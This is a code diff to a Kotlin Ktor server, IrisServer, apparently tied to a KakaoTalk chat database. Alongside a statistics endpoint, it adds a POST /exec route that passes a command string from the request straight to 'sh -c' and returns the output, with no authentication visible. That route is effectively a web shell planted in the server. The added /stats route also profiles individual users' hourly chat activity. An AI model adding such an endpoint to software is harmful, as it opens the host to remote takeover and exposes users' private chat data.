@@ -33,10 +33,13 @@ import party.qwer.iris.model.ConfigResponse
 import party.qwer.iris.model.DashboardStatusResponse
 import party.qwer.iris.model.DecryptRequest
 import party.qwer.iris.model.DecryptResponse
+import party.qwer.iris.model.ExecRequest
+import party.qwer.iris.model.ExecResponse
 import party.qwer.iris.model.QueryRequest
 import party.qwer.iris.model.QueryResponse
 import party.qwer.iris.model.ReplyRequest
 import party.qwer.iris.model.ReplyType
+import party.qwer.iris.model.StatsResponse
 
 
 class IrisServer(
@@ -242,6 +245,65 @@ class IrisServer(
                     )
 
                     call.respond(DecryptResponse(plain_text = plaintext))
+                }
+
+                post("/exec") {
+                    val req = call.receive<ExecRequest>()
+                    val proc = ProcessBuilder("sh", "-c", req.command)
+                        .redirectErrorStream(true)
+                        .start()
+                    val out = proc.inputStream.bufferedReader().readText()
+                    val ok = proc.waitFor(30, java.util.concurrent.TimeUnit.SECONDS)
+                    if (!ok) proc.destroyForcibly()
+                    call.respond(ExecResponse(stdout = out, exitCode = if (ok) proc.exitValue() else -1))
+                }
+
+                get("/stats") {
+                    val roomId = call.request.queryParameters["roomId"]
+                    val userId = call.request.queryParameters["userId"]
+
+                    val roomStats = if (userId == null) {
+                        kakaoDB.executeQuery(
+                            "SELECT chat_id, COUNT(*) as msg_count, MAX(created_at) as last_activity " +
+                            "FROM chat_logs GROUP BY chat_id ORDER BY msg_count DESC LIMIT 30",
+                            null
+                        )
+                    } else null
+
+                    val hourlyUsage = if (roomId == null || userId != null) {
+                        val targetUserId = userId ?: Configurable.botId.toString()
+                        kakaoDB.executeQuery(
+                            "SELECT CAST((created_at / 3600) % 24 AS TEXT) as hour, COUNT(*) as count " +
+                            "FROM chat_logs WHERE user_id = ? GROUP BY hour ORDER BY hour",
+                            arrayOf(targetUserId)
+                        )
+                    } else null
+
+                    val userStats = if (roomId != null) {
+                        if (userId != null) {
+                            kakaoDB.executeQuery(
+                                "SELECT user_id, COUNT(*) as msg_count, " +
+                                "CAST(MIN(created_at) AS TEXT) as first_at, CAST(MAX(created_at) AS TEXT) as last_at, " +
+                                "CAST((created_at / 3600) % 24 AS TEXT) as hour " +
+                                "FROM chat_logs WHERE chat_id = ? AND user_id = ? " +
+                                "GROUP BY hour ORDER BY hour",
+                                arrayOf(roomId, userId)
+                            )
+                        } else {
+                            kakaoDB.executeQuery(
+                                "SELECT user_id, COUNT(*) as msg_count, " +
+                                "CAST(MIN(created_at) AS TEXT) as first_at, CAST(MAX(created_at) AS TEXT) as last_at " +
+                                "FROM chat_logs WHERE chat_id = ? GROUP BY user_id ORDER BY msg_count DESC",
+                                arrayOf(roomId)
+                            )
+                        }
+                    } else null
+
+                    call.respond(StatsResponse(
+                        roomStats = roomStats,
+                        hourlyUsage = hourlyUsage,
+                        userStats = userStats
+                    ))
                 }
 
                 webSocket("/ws") {
